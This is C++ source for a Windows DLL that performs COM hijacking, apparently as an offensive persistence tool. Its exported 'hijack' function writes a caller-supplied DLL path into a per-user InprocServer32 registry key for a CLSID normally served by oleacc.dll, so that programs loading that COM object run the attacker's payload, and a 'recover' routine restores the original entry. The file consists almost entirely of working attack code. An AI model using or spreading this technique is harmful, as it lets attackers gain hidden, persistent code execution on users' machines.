#include <iostream>
#include <Windows.h> 
#include <string>
using namespace std;


BOOL TestMutex()
{

	HANDLE hMutex = CreateMutexA(NULL, false, "myself");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hMutex);
		return 0;
	}
	return 1;
}

BOOL calcHijack(char payload[])
{
	HKEY hKey;
	DWORD dwDisposition;
	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
		"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",
		0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition)) {
		printf("打开注册表失败！");
		exit(-1);
	}

	if (ERROR_SUCCESS != RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload, (1 + lstrlenA(payload)))) {
		printf("设置DLL文件失败！");
		exit(-1);
	}

	printf("[+] HiJack successfully!");

}

BOOL recover()
{
	HKEY hKey;
	DWORD dwDisposition;
	char payload[] = "C:\\Windows\\System32\\oleacc.dll";

	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
		"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",
		0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition)) {
		printf("打开注册表失败！");
		exit(-1);
	}

	if (ERROR_SUCCESS != RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload, (1 + lstrlenA(payload)))) {
		printf("设置DLL文件失败！");
		exit(-1);
	}
	printf("[+] Recover successfully!");
}

extern "C" __declspec(dllexport)
void hijack(
	HWND hwnd,        // handle to owner window   
	HINSTANCE hinst,  // instance handle for the DLL   
	LPTSTR lpCmdLine, // string the DLL will parse   
	int nCmdShow      // show state   
)
{
	if (strlen(lpCmdLine) != 0)
	{
		TestMutex();
		calcHijack(lpCmdLine);
	}
	else
	{
		recover();
	}
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

